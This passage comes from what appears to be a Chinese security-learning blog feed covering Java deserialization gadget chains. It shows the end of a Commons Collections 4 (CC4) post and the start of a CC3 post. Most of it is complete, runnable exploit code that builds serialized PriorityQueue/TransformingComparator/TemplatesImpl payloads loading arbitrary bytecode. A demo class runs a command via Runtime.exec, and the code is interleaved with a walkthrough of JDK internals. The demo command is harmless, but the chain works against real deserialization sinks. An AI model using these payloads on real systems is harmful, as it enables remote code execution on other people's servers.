class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();    <span class="hljs-comment">//TemplatesImpl类可以序列化，直接new</span><br>        <span class="hljs-comment">//反射修改类的属性_name</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改类的属性_bytecodes</span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/home/yinyun/Documents/JavaLearing/CC/target/classes/runtime.class&quot;</span>));   <span class="hljs-comment">//构建一维byte数组，为了适应defineClass接收的参数，并从文件里读byte</span><br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;  <span class="hljs-comment">//把一维byte数组变成二维的交给_bytecodes</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodesField.set(templates,codes);<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);   <span class="hljs-comment">//方法一</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br>        <span class="hljs-comment">//方法一修改size</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">priorityQueueClass</span> <span class="hljs-operator">=</span> priorityQueue.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">sizeField</span> <span class="hljs-operator">=</span> priorityQueueClass.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>        sizeField.setAccessible(<span class="hljs-literal">true</span>);<br>        sizeField.set(priorityQueue,<span class="hljs-number">2</span>);<br><br>        serialize(priorityQueue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;serialize&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>我们也能通过该类自带的add方法给size传值，我们进入add：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">add</span><span class="hljs-params">(E e)</span> &#123;<br>    <span class="hljs-keyword">return</span> offer(e);<br>&#125;<br></code></pre></td></tr></table></figure><p>进入offer：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">offer</span><span class="hljs-params">(E e)</span> &#123;<br>    <span class="hljs-keyword">if</span> (e == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();<br>    modCount++;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> size;<br>    <span class="hljs-keyword">if</span> (i &gt;= queue.length)<br>        grow(i + <span class="hljs-number">1</span>);<br>    size = i + <span class="hljs-number">1</span>;      <span class="hljs-comment">//给size传值</span><br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<br>        queue[<span class="hljs-number">0</span>] = e;<br>    <span class="hljs-keyword">else</span><br>        siftUp(i, e);       <span class="hljs-comment">//siftUP方法</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入siftUP方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftUp</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)<br>        siftUpUsingComparator(k, x);<br>    <span class="hljs-keyword">else</span><br>        siftUpComparable(k, x);<br>&#125;<br></code></pre></td></tr></table></figure><p>发现siftUP和siftDown方法几乎是一模一样的。</p><p>这里跟URLDNS链差不多，如果我们直接调用add方法，这里就会走完整条链子，但是并不会反序列化，所以我们需要先在前面把比如给TransformingComparator赋值一个没用的，然后add完了之后再改回chainedTransformer。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p>add后反射修改回去即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">priorityQueue.add(<span class="hljs-number">1</span>);<br>priorityQueue.add(<span class="hljs-number">2</span>);<br><br><span class="hljs-type">Class</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> t.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>transformerField.set(transformingComparator,chainedTransformer);<br></code></pre></td></tr></table></figure><h4 id="完整CC4链："><a href="#完整CC4链：" class="headerlink" title="完整CC4链："></a>完整CC4链：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();    <span class="hljs-comment">//TemplatesImpl类可以序列化，直接new</span><br>        <span class="hljs-comment">//反射修改类的属性_name</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改类的属性_bytecodes</span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/home/yinyun/Documents/JavaLearing/CC/target/classes/runtime.class&quot;</span>));   <span class="hljs-comment">//构建一维byte数组，为了适应defineClass接收的参数，并从文件里读byte</span><br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;  <span class="hljs-comment">//把一维byte数组变成二维的交给_bytecodes</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodesField.set(templates,codes);<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);   //方法一</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">//方法二</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br>        <span class="hljs-comment">//方法一修改size</span><br><span class="hljs-comment">//        Class priorityQueueClass = priorityQueue.getClass();</span><br><span class="hljs-comment">//        Field sizeField = priorityQueueClass.getDeclaredField(&quot;size&quot;);</span><br><span class="hljs-comment">//        sizeField.setAccessible(true);</span><br><span class="hljs-comment">//        sizeField.set(priorityQueue,2);</span><br><br>        <span class="hljs-comment">//方法二</span><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> t.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator,chainedTransformer);<br><br>        serialize(priorityQueue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;serialize&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA反序列化——CC3链</title>
    <link href="/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3%E9%93%BE/"/>
    <url>/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>这条链是利用动态类加载来经行代码执行。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>根据java类的动态加载原理，我们知道动态类加载可以通过ClassLoader来完成。而其中有个ClassLoader.defineClass可以从字节码加载任意类。</p><p>因为是动态类加载，我们先编写一个class类，以便后续我们加载这个类代码执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">runtime</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;mate-calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们编译一下上述代码，生成一个runtime.class文件。</p><h1 id="寻找"><a href="#寻找" class="headerlink" title="寻找"></a>寻找</h1><p>在<strong>ClassLoader类</strong>里的defineClass方法都是私有的，我们需要找到公有或者default类型的defineClass方法。在ClassLoader.defineClass里反向寻找哪里有公有或者default类型的defineClass方法。</p><p>在<strong>TemplatesImpl类</strong>里有一个default类型的defineClass方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>    <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>&#125;<br></code></pre></td></tr></table></figure><p>该方法是在本类的defineTransletClasses()中被调用了的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>    …………<br>    <span class="hljs-keyword">try</span> &#123;<br>……<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>                _class[i] = loader.defineClass(_bytecodes[i]);      <span class="hljs-comment">//调用defineClass</span><br>        …………<br>    &#125;<br></code></pre></td></tr></table></figure><p>但这个方法也是私有的，所以我们还要继续找。</p><p>本类还有三个地方调用了defineTransletClasses()，但是只有getTransletInstance()方法中有可利用的点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();    <span class="hljs-comment">//调用defineTransletClasses方法</span><br><br>        <span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();   <span class="hljs-comment">//newInstance类的初始化，关键入侵点</span><br>…………<br>        <span class="hljs-keyword">return</span> translet;<br>    &#125;<br>…………<br>&#125;<br></code></pre></td></tr></table></figure><p>但是getTransletInstance()方法还是私有的，我们继续往回找。</p><p>只有一个地方，本类的newTransformer()方法调用了getTransletInstance()，同时这个方法是public的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title function_">newTransformer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException&#123;<br>    TransformerImpl transformer;<br><br>    transformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,_indentNumber, _tfactory); <span class="hljs-comment">//调用getTransletInstance()</span><br>…………<br>    <span class="hljs-keyword">return</span> transformer;<br>&#125;<br></code></pre></td></tr></table></figure><p>而在这所有的方法的类TemplatesImpl类恰好也是继承了序列化接口的，这就很方便。</p><p>所以整条链子是这样的：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">newTransformer</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">getTransletInstance</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">defineTransletClasses</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">defineClass</span>-&gt;</span>代码执行<br></code></pre></td></tr></table></figure><h1 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();    <span class="hljs-comment">//TemplatesImpl类可以序列化，直接new</span><br>templates.newTransformer();     <span class="hljs-comment">//第一步入口方法，newTransformer</span><br></code></pre></td></tr></table></figure><p>不用管newTransformer的参数，它肯定会调用getTransletInstance，我们看这个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    <span class="hljs-comment">//这里判断_name是否为空，我们这里需要给_name赋一个值</span><br><br>            <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();      <span class="hljs-comment">//为了调用defineTransletClasses，我们需要把_class置空</span><br><br>            <span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();<br>            translet.postInitialization();<br>            translet.setTemplates(<span class="hljs-built_in">this</span>);<br>            translet.setServicesMechnism(_useServicesMechanism);<br>            translet.setAllowedProtocols(_accessExternalStylesheet);<br>            <span class="hljs-keyword">if</span> (_auxClasses != <span class="hljs-literal">null</span>) &#123;<br>                translet.setAuxiliaryClasses(_auxClasses);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> translet;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (InstantiationException e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在defineTransletClasses方法中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br><br>        <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-literal">null</span>) &#123;      <span class="hljs-comment">//_bytecodes需要赋值，不然会抛出一个Error</span><br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 